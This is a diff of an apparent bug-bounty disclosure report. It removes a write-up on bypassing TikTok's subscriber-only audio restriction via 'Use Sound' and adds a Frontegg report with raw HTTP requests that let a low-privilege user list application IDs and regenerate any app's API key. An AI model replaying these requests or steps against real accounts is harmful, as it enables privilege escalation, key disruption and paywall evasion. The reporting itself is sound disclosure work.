@@ -1,72 +1,154 @@
-**Program:** Tiktok  **Asset:** 835599320  **Weakness:** Business Logic Error
+**Program:** Frontegg  **Asset:** portal.au.frontegg.com  **Weakness:** Improper Access Control
 
-**Title: Non-Subscribers Can Access Full Audio of Subscriber-Only Videos via “Use Sound” Feature
+**Title: Low-Privilege User Can Access App IDs and Regenerate App API Keys Without Proper Authorization
 ## Description:
 
-TikTok allows creators to publish **subscriber-only videos** that can only be fully accessed by users who subscribe to the creator. Non-subscribers are supposed to see only a **short preview** of the video. After the preview ends, the video becomes blurred and the audio stops.
+A low-privilege user (`Entitlement Viewer`) can **fetch sensitive application details** and **regenerate API keys** for any application in the organization **without proper authorization**.  
 
-However, during the preview period TikTok still allows users to tap the **“Use Sound”** option attached to the video. When a non-subscriber records a video using that sound, the **entire audio from the subscriber-only video continues playing until the end**, allowing the attacker to listen to the full content without subscribing.
+This issue occurs because:
 
-This effectively bypasses the intended subscription restriction for subscriber-only content.
+1. Fetching **application IDs and metadata** is **not properly restricted**.  
+2. **Regenerating API keys** does not re-check the user’s role for sensitive operations.  
 
-# Context and Impact on Content Creators
-For many TikTok creators, **audio is the most important part of the content**. A large portion of subscriber-only videos are:
+**Important distinction:**  
+- Attempts to **create** or **delete applications** are correctly blocked (`403 Forbidden`), showing proper permission checks.  
+- Only the **fetch + regenerate** flow is vulnerable.
 
-- **Story-time content**
-- **News or commentary**
-- **Exclusive announcements**
-- **Promo codes or discount codes shared only with subscribers**
-
-In these types of videos, the **message is delivered entirely through speech**, meaning the video visuals are not necessary to understand the content.
-
-For example, creators such as:  
-https://www.tiktok.com/@cristinabruno1111/
-
-primarily produce **story-time and commentary style content**, where the main value of the content is the **spoken narrative**. Even without seeing the video, a user can fully understand the information simply by listening to the audio.
-
-Because of this vulnerability, an attacker can listen to the **entire spoken content of subscriber-only videos**, including exclusive information such as subscriber-only promo codes, announcements, or stories that were intended to be restricted to paying subscribers.
+This allows a low-privilege user to escalate into admin-like actions **without ever being granted admin privileges**.
 
 
 ---
 
 ## Steps to Reproduce
-1. Find a content creator with sub only content for example lets use (https://www.tiktok.com/@cristinabruno1111/)
-2. go to their page and tap the subscription button
-![Image](https://github.com/user-attachments/assets/abdd3e89-85a6-4690-813d-5030046f13dc)
-3. Now click the list of sub only content
-  ![Image](https://github.com/user-attachments/assets/284f0491-c053-458f-9acd-520513e6e2a4)
-4. You will see the list of sub only content and also you will observe you can preview some of the videos for few seconds Now click one of the videos to preview it
-  ![Image](https://github.com/user-attachments/assets/f434777c-3a37-4262-bee8-3e8e2a8a9174)
-5. During the preview period (before the video becomes blurred), tap sound icon
-   ![Image](https://github.com/user-attachments/assets/3b3decae-0be7-4413-99f8-1247cfbd48ca)
-6. tap **“Use Sound.”**
-   ![Image](https://github.com/user-attachments/assets/91ab2b87-d109-4580-9797-5b3f5aefa396)
-7. select 10mins and start recording
-   ![Image](https://github.com/user-attachments/assets/b63711d5-6fb5-4a7d-8ec1-da1741719e0e)
-8. Observe that the **full audio of the subscriber-only video continues playing until the end**.
-   ![Image](https://github.com/user-attachments/assets/8a6a7151-c0c8-4345-beab-01872104e472)
+1. Go to https://portal.au.frontegg.com/development/applications and create an app in your organization (you can create 2-3)
+<img width="959" height="448" alt="Screenshot 2026-04-02 214616" src="https://github.com/user-attachments/assets/b337f45f-99c8-47d6-bf1e-fab4aade387d" />
 
+2. Go to https://portal.au.frontegg.com/development/applications#/admin-box/users and add a team member with the **Entitlement Viewer** role.
+<img width="959" height="448" alt="Screenshot 2026-04-02 215128" src="https://github.com/user-attachments/assets/9d6c6c51-29d5-4348-afbd-06119db2cfce" />
+
+3. Now as the invited team member (attacker), accept the invite and login to account
+4. Observe you only have access to few things and can't access https://portal.au.frontegg.com/development/applications to see the organization applications.
+5. Now run the request below and observe that the response fetches app details and ID's in the organization even though this user should not have access to the organization apps. (Use the bearer token and cookie with the current one you have in the orgnaiztion)
+```
+GET /applications/resources/applications/v1?_excludeAgents=true HTTP/2
+Host: api.au.frontegg.com
+Cookie: [REDACTED_COOKIE]
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer 
+[REDACTED_BEARER_TOKEN]
+Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+X-Frame-Options: SAMEORIGIN
+Origin: https://portal.au.frontegg.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://portal.au.frontegg.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+```
+6. Next send the request below to Regenerate API Key of any app in the organization (Use the bearer token and cookie with the current one you have in the orgnaiztion and also replace the `appId` with any of the ID's you fetched earlier)
+```
+POST /applications/resources/applications/v1/credentials/regenerate HTTP/2
+Host: api.au.frontegg.com
+Cookie: [REDACTED_COOKIE]
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer 
+[REDACTED_BEARER_TOKEN]
+Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+X-Frame-Options: SAMEORIGIN
+Origin: https://portal.au.frontegg.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://portal.au.frontegg.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+Content-Length: 48
+
+{"appId":"SAVED_APP_ID"}
+```
+7. Observe that the request succeeds
+8. Now as the organization owner go to the apps setting page (e.g: https://portal.au.frontegg.com/development/applications/APP_ID) and observe that the API Key as been regenerated
+9. Verification of Proper Permission Checks (for context):
+**CREATE APP ATTEMPT** (Run the graph ql reuest below Using the same cookie and bearer token and observe the response `"errors":["Missing permissions: dp.applications.write.app"]`)
+```
+POST /applications/resources/applications/v1 HTTP/2
+Host: api.au.frontegg.com
+Cookie: [REDACTED_COOKIE]
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer
+[REDACTE_BEARER_TOKEN]
+Frontegg-Environment-Id: ad8b5467-683d-400a-8658-0bf991f0eed7
+Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+X-Frame-Options: SAMEORIGIN
+Origin: https://portal.au.frontegg.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://portal.au.frontegg.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+Content-Length: 208
+
+{"name":"NEW","appURL":"http://localhost:3000","loginURL":"https://app-g0fcgj4o3wpu.au.frontegg.com/oauth","accessType":"MANAGED_ACCESS","isDefault":false,"isActive":true,"type":"web","frontendStack":"react"}
+```
+
+**DELETE APP ATTEMPT** (Run the graph ql reuest below Using the same cookie and bearer token and observe the response `"errors":["Missing permissions: dp.applications.write.app"]`)
+```
+DELETE /applications/resources/applications/v1/3a3a71f9-8f7a-44ea-9a39-514f1a55622c HTTP/2
+Host: api.au.frontegg.com
+Cookie: [REDACTED_COOKIE]
+Sec-Ch-Ua-Platform: "Windows"
+Authorization: Bearer
+[REDACTED_BEARER_TOKEN]
+Frontegg-Environment-Id: ad8b5467-683d-400a-8658-0bf991f0eed7
+Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+X-Frame-Options: SAMEORIGIN
+Origin: https://portal.au.frontegg.com
+Sec-Fetch-Site: same-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://portal.au.frontegg.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Priority: u=1, i
+```
 ---
 
 ## Impact
-A non-subscriber can listen to the full audio of subscriber-only videos using the **“Use Sound”** feature, bypassing the subscription restriction and exposing exclusive subscriber content.
-
-Because the full audio track of the subscriber-only video is accessible, an attacker can obtain the complete spoken content of the restricted video. For many creators, the audio contains the entire message of the content, meaning the attacker can access all information intended only for subscribers.
+A low-privilege user can access sensitive application IDs and metadata and regenerate API keys without authorization, compromising the confidentiality and integrity of organizational apps and their integrations.
 
 ---
 
 ## Severity
-**CVSS v3.0 Base Score:** 6.4 → Medium  
+**CVSS v3.0 Base Score:** 8.1 → High  
 
 | Metric | Value |
 |--------|-------|
 | Attack Vector (AV) | Network |
 | Attack Complexity (AC) | Low |
-| Privileges Required (PR) | None |
+| Privileges Required (PR) | Low |
 | User Interaction (UI) | None |
 | Scope (S) | Unchanged |
 | Confidentiality (C) | High |
-| Integrity (I) | none |
+| Integrity (I) | High |
 | Availability (A) | None |
 
 ---
